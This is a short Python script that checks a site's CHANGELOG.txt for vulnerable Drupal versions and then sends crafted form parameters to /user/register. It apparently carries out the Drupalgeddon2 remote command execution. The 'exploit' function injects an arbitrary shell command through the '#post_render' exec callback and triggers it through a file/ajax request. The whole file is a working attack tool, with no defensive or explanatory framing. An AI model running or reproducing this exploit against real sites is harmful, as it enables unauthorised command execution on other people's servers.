import requests
import re
from bs4 import BeautifulSoup

def check_version(url):
    try: 

        url = url + "/CHANGELOG.txt"
        r = requests.get(url)
        
        fixed_version = ['7.58', '8.3.9', '8.4.6', '8.5.1']
        items = re.findall("Drupal .*$", r.text, re.MULTILINE)

        current_version = items[0].split(",")[0].split(" ")[1]
        if(current_version < "7.58") or(("8.3." in current_version) and (current_version < "8.3.9")) or (("8.4." in current_version) and (current_version < "8.4.6")) or(("8.5." in current_version) and (current_version < "8.5.1")):
            return True
        else: 
            return False 
        
    except: 
        return False

def exploit(url, cmd): 
    try: 
        get_params1 = {'q':'user/password', 'name[#post_render][]':'exec', 'name[#type]':'markup', 'name[#markup]': cmd}
        post_params1 = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
        r = requests.post(url + "/user/register", params=get_params1, data=post_params1, verify=False, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id':form_build_id}
            r = requests.post(url + "/user/register", params=get_params, data=post_params, verify=False, timeout=5)
            return True
    except Exception as e: 
        return False